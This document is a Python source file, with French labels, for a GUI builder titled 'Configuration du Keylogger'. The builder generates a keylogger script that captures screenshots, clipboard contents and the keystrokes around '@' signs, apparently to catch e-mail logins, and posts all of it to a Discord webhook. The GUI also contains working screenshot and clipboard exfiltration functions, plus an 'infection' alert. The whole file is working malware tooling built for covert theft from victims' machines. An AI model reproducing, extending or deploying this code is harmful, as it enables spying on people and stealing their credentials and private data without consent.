from pynput import keyboard
import sys
import time
import customtkinter as ctk
from tkinter import messagebox
import requests
import json
import os
from datetime import datetime
import clipboard
import threading
from PIL import ImageGrab
import io

historique = []
capture_apres_at = False
apres_at_buffer = []
compteur = 0

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

# ---------------- VARIABLES GLOBALES ----------------
debut_heure = None
fin_heure = None
nom_fichier = ""  # <- ici on stocke le nom du keylog

# ---------------- FONCTIONS ----------------
def valider_webhook():
    if webhook_entry.get().strip() == "":
        messagebox.showerror("Erreur", "Le champ du webhook ne peut pas être vide.")

# Option heure d'activité
def activity_time_option_selected():
    global debut_heure, fin_heure
    if activity_time_option.get():
        heure = ctk.CTkToplevel(app)
        heure.geometry("400x300")
        heure.title("Configuration de l'heure d'activité")

        debut_label = ctk.CTkLabel(heure, text="Heure de début (HH:MM):", font=ctk.CTkFont(size=14))
        debut_label.pack(pady=10)
        debut_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
        debut_entry.pack(pady=10)

        fin_label = ctk.CTkLabel(heure, text="Heure de fin (HH:MM):", font=ctk.CTkFont(size=14))
        fin_label.pack(pady=10)
        fin_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
        fin_entry.pack(pady=10)

        def valider_hour():
            nonlocal debut_entry, fin_entry
            heure_debut_valide = debut_entry.get().strip()
            heure_fin_valide = fin_entry.get().strip()
            if heure_debut_valide == "" or heure_fin_valide == "":
                messagebox.showerror("Erreur", "Les champs d'heure de début et de fin ne peuvent pas être vides.")
                return
            try:
                global debut_heure, fin_heure
                debut_heure = datetime.strptime(heure_debut_valide, "%H:%M").time()
                fin_heure = datetime.strptime(heure_fin_valide, "%H:%M").time()
            except ValueError as e:
                messagebox.showerror("Erreur", f"Une erreur est survenue : {e}")
                return
            messagebox.showinfo("Info", f"Heures d'activité définies : {debut_heure} -> {fin_heure}")
            heure.destroy()

        valider_heure_btn = ctk.CTkButton(heure, text="Valider", font=ctk.CTkFont(size=14), command=valider_hour)
        valider_heure_btn.pack(pady=20)

# Option choix du nom du keylogs
def nom_keylogs():
    global nom_fichier
    nom_window = ctk.CTkToplevel(app)
    nom_window.geometry("400x200")
    nom_window.title("Choix du nom du keylogs")

    nom_label = ctk.CTkLabel(nom_window, text="Entrez le nom du fichier keylogs sans l'extension:", font=ctk.CTkFont(size=14))
    nom_label.pack(pady=10)
    nom_entry = ctk.CTkEntry(nom_window, width=200, font=ctk.CTkFont(size=14))
    nom_entry.pack(pady=10)

    def valider():
        global nom_fichier
        nom = nom_entry.get().strip()
        if nom == "":
            messagebox.showerror("Erreur", "Le champ du nom du fichier keylogs ne peut pas être vide.")
            return
        nom_fichier = nom
        nom_window.destroy()

    valider_nom_btn = ctk.CTkButton(nom_window, text="Valider", font=ctk.CTkFont(size=14), command=valider)
    valider_nom_btn.pack(pady=20)

# ---------------- OPTIONS ----------------
def screenshot_option_func():
    im = ImageGrab.grab()
    buffer = io.BytesIO()
    im.save(buffer, format="PNG")
    buffer.seek(0)
    webhook_url = webhook_entry.get()
    files = {'file': ('screenshot.png', buffer, 'image/png')}
    requests.post(webhook_url, files=files)

def clipboard_option_func():
    old = clipboard.paste()
    webhook_url = webhook_entry.get()
    while True:
        time.sleep(1)
        mtn = clipboard.paste()
        if old != mtn:
            requests.post(webhook_url, json={"content": mtn})
            old = mtn

def autostart_option_func():
    print("Option autostart activée")

def capture_before_after_at_option_func():
    def touche(key):
        global historique, capture_apres_at, apres_at_buffer, compteur
        try:
            caractere = key.char
            historique.append(caractere)
            if capture_apres_at:
                apres_at_buffer.append(caractere)
                compteur += 1
                if compteur >= 20:
                    print("\n--- 20 caractères après @ ---")
                    print(''.join(apres_at_buffer))
                    print("--------------------------------\n")
                    capture_apres_at = False
                    apres_at_buffer = []
                    compteur = 0
        except AttributeError:
            print(f"Special key {key} pressed")

        if hasattr(key, 'char') and key.char == '@':
            print("\n--- 16 caractères avant @ ---")
            print(''.join(historique[-30:]))
            print("--------------------------------")
            capture_apres_at = True
            apres_at_buffer = []
            compteur = 0

        

    with keyboard.Listener(on_press=touche) as listener:
        listener.join()

def low_and_slow_option_func():
    messagebox.showinfo("Information", "L'option 'Low and Slow' a été sélectionnée.")

def alert_on_infection_option_func():
    discord_webhook = webhook_entry.get()
    if discord_webhook.strip() == "":
        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour cette option.")
        return
    message = {"content": "Alerte : Une contamination a été détectée sur le système infecté."}
    requests.post(discord_webhook, json=message)

def test_webhook():
    test = webhook_entry.get().strip()
    if test == "":
        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour ce test.")
        return
    message = {"content": "Ceci est un message de test pour vérifier le webhook Discord."}
    envoyer = requests.post(test, json=message)
    if envoyer.status_code == 204:
        messagebox.showinfo("Succès", "Le webhook Discord fonctionne correctement.")
    else:
        messagebox.showerror("Erreur", f"Le webhook Discord a échoué avec le code d'erreur : {envoyer.status_code}")

# ---------------- BUILDER ----------------
def lancer_programme():
    global nom_fichier

    if nom_fichier.strip() == "":
        messagebox.showerror("Erreur", "Nom du fichier vide")
        return

    filename = f"{nom_fichier}.py"

    config = {
        "webhook": webhook_entry.get().strip(),
        "options": {
            "screenshot": screenshot_var.get(),
            "clipboard": clipboard_var.get(),
            "autostart": autostart_var.get(),
            "activity_time": activity_time_var.get(),
            "capture_before_after_at": capture_var.get(),
            "low_and_slow": low_slow_var.get(),
            "alert_on_infection": alert_var.get()
        }
    }

    if config["webhook"] == "":
        messagebox.showerror("Erreur", "Veuillez entrer un webhook avant de continuer.")
        return

    # 👉 TOUT le fichier est maintenant écrit DANS le with open()
    with open(filename, "w", encoding="utf-8") as f:
        f.write("# Fichier généré automatiquement\n")
        f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
        f.write("OPTIONS = {\n")
        for option, valeur in config["options"].items():
            f.write(f"    '{option}': {valeur},\n")
        f.write("}\n\n")

        f.write("import threading\n\n")

        # Screenshot
        if config["options"]["screenshot"]:
            f.write("import requests, io\nfrom PIL import ImageGrab\n")
            f.write("def screenshot_option_func():\n")
            f.write("    im = ImageGrab.grab()\n")
            f.write("    buffer = io.BytesIO()\n")
            f.write("    im.save(buffer, format='PNG')\n")
            f.write("    buffer.seek(0)\n")
            f.write("    files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
            f.write("    requests.post(WEBHOOK, files=files)\n\n")

        # Clipboard
        if config["options"]["clipboard"]:
            f.write("import clipboard, time, requests\n")
            f.write("def clipboard_option_func():\n")
            f.write("    old = clipboard.paste()\n")
            f.write("    while True:\n")
            f.write("        time.sleep(1)\n")
            f.write("        mtn = clipboard.paste()\n")
            f.write("        if old != mtn:\n")
            f.write("            requests.post(WEBHOOK, json={'content': mtn})\n")
            f.write("            old = mtn\n\n")

        # Capture avant/après @
        if config["options"]["capture_before_after_at"]:
            f.write("import requests, time\nfrom pynput import keyboard\n")
            f.write("historique = []\n")
            f.write("capture_apres_at = False\n")
            f.write("apres_at_buffer = []\n")
            f.write("compteur = 0\n\n")
            f.write("def capture_before_after_at_option_func():\n")
            f.write("    def touche(key):\n")
            f.write("        global historique, capture_apres_at, apres_at_buffer, compteur\n")
            f.write("        try:\n")
            f.write("            caractere = key.char\n")
            f.write("            historique.append(caractere)\n")
            f.write("            if capture_apres_at:\n")
            f.write("                apres_at_buffer.append(caractere)\n")
            f.write("                compteur += 1\n")
            f.write("                if compteur >= 20:\n")
            f.write("                    data = 'Avant @: ' + ''.join(historique[-30:]) + '\\nApres @: ' + ''.join(apres_at_buffer)\n")
            f.write("                    requests.post(WEBHOOK, json={'content': data})\n")
            f.write("                    capture_apres_at = False\n")
            f.write("                    apres_at_buffer = []\n")
            f.write("                    compteur = 0\n")
            f.write("        except AttributeError:\n")
            f.write("            pass\n")
            f.write("        if hasattr(key, 'char') and key.char == '@':\n")
            f.write("            capture_apres_at = True\n")
            f.write("            apres_at_buffer = []\n")
            f.write("            compteur = 0\n\n")
            f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
            f.write("        listener.join()\n\n")

        # Autres options (fonction vide)
        for opt in ["autostart", "activity_time", "low_and_slow", "alert_on_infection"]:
            if config["options"][opt]:
                f.write(f"def {opt}_option_func():\n")
                f.write(f"    print('Option {opt} activée')\n\n")

        # Lancement des threads
        f.write("if __name__ == '__main__':\n")
        for opt, val in config["options"].items():
            if val:
                f.write(f"    threading.Thread(target={opt}_option_func).start()\n")

    messagebox.showinfo("Succès", f"✅ Fichier '{filename}' créé avec succès !")
    app.destroy()

    messagebox.showinfo("Succès", f"✅ Fichier '{filename}' créé avec les options sélectionnées.")
    app.destroy()

# ---------------- INTERFACE ----------------
app = ctk.CTk()
app.geometry("900x700")
app.title("Configuration du Keylogger")

titre = ctk.CTkLabel(app, text="Configuration du Keylogger", font=ctk.CTkFont(size=20, weight="bold"))
titre.pack(pady=20)

instructions = ctk.CTkLabel(app, text="Entrez le nom du webhook Discord pour envoyer les logs capturés :", font=ctk.CTkFont(size=16))
instructions.pack(pady=10)
webhook_entry = ctk.CTkEntry(app, width=400, font=ctk.CTkFont(size=14), placeholder_text="https://discord.com/api/webhooks/...")
webhook_entry.pack(pady=10)

webhook_btn = ctk.CTkButton(app, text="Valider", font=ctk.CTkFont(size=14), command=valider_webhook)
webhook_btn.pack(pady=10)

test_btn = ctk.CTkButton(app, text="Tester le webhook", font=ctk.CTkFont(size=14), command=test_webhook)
test_btn.pack(pady=10)

# Variables reliées aux cases à cocher
choix_nom_var = ctk.BooleanVar(value=False)
screenshot_var = ctk.BooleanVar(value=False)
clipboard_var = ctk.BooleanVar(value=False)
autostart_var = ctk.BooleanVar(value=False)
activity_time_var = ctk.BooleanVar(value=False)
capture_var = ctk.BooleanVar(value=False)
low_slow_var = ctk.BooleanVar(value=False)
alert_var = ctk.BooleanVar(value=False)

# Cases à cocher
choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", variable=choix_nom_var, command=nom_keylogs)
choix_nom.pack(pady=5)
screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran", variable=screenshot_var)
screenshot_option.pack(pady=5)
clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", variable=clipboard_var)
clipboard_option.pack(pady=5)
autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", variable=autostart_var)
autostart_option.pack(pady=5)
activity_time_option = ctk.CTkCheckBox(app, text="Heure d'activité", variable=activity_time_var, command=activity_time_option_selected)
activity_time_option.pack(pady=5)
capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", variable=capture_var)
capture_before_after_at_option.pack(pady=5)
low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow", variable=low_slow_var)
low_and_slow_option.pack(pady=5)
alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var, command=alert_on_infection_option_func)
alert_on_infection_option.pack(pady=5)

# Bouton lancer
lancer_btn = ctk.CTkButton(app, text="Lancer le programme", font=ctk.CTkFont(size=16, weight="bold"), command=lancer_programme)
lancer_btn.pack(pady=20)

app.mainloop()
